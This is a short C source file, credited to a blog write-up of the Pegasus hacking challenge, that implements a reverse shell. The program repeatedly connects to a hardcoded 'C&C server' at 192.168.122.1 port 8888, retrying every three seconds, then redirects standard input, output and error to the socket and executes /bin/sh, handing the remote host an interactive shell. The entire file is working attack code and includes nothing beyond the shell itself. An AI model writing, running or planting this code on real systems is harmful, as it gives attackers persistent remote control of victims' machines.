/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/
 */
#include <netinet/in.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define REMOTE_ADDR "192.168.122.1"
#define REMOTE_PORT 8888

int main(int argc, char *argv[]) {
  struct sockaddr_in sa;
  int s;

  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  sa.sin_port = htons(REMOTE_PORT);

  s = socket(AF_INET, SOCK_STREAM, 0);

  printf("Connecting to C&C server\n");
  int err;
  do {
    err = connect(s, (struct sockaddr *)&sa, sizeof(sa));
    if (err == -1) {
      printf("Connection to the target server failed, Pause 3 seconds!\n");
      sleep(3);
      printf("Reconnecting to C&C server!\n");
    }
  } while (err == -1);

  dup2(s, 0);
  dup2(s, 1);
  dup2(s, 2);

  execve("/bin/sh", 0, 0);
  return 0;
}
